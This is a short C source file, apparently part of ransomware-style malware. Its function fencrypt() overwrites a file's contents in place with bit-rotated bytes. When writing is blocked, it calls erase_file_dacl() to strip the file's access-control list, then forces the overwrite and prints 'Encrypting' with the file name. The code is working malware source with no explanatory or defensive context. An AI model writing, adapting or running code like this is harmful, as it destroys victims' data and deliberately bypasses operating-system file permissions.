#include <stdio.h>
#include <stdlib.h>
#include "winkit.h"
#include "airf.h"

void fencrypt(char *fname) {

	FILE *f;
	char *bitbuf, asmp;
	long fsize;

	if ((f = fopen(fname, "rb")) == NULL) {
		fprintf(stderr, "%s%s\n", fname, " is under lock and key.");
		return;
	}
	if (fseek(f, 0, SEEK_END) == -1) {
		perror("fseek err");
		exit(EXIT_FAILURE);
	}
	fsize = ftell(f);
	rewind(f);
	if ((bitbuf = malloc(sizeof(char) * fsize)) == NULL) {
		perror("malloc err");
		exit(EXIT_FAILURE);
	}
	if (fread(bitbuf, sizeof(char), fsize, f) < 0) 
		if (ferror(f)) {
			perror("fread err");
			exit(EXIT_FAILURE);
		}
	for (int i = 0; i < fsize; i++) {
		asmp = *(bitbuf + i);
		asm volatile (
			"rolb %2, %1"
			: "=r"(asmp)
			: "r"(asmp), "i"(DEGREE)
		);
		*(bitbuf + i) = asmp;
	}
	if (freopen(fname, "wb", f) == NULL) {
		if (!erase_file_dacl(fname)) {
			fprintf(stderr, "%s%s\n", fname, " is under lock and key.");
			free(bitbuf);
			return;
		}
		freopen(fname, "wb", f);
	}
	printf("%s %s.\n", "Encrypting", fname);
	if (fwrite(bitbuf, sizeof(char), fsize, f) < 0) {
		perror("fwrite err");
		exit(EXIT_FAILURE);
	}
	if (fclose(f) == -1) {
		perror("fclose err");
		exit(EXIT_FAILURE);
	}
	free(bitbuf);

}
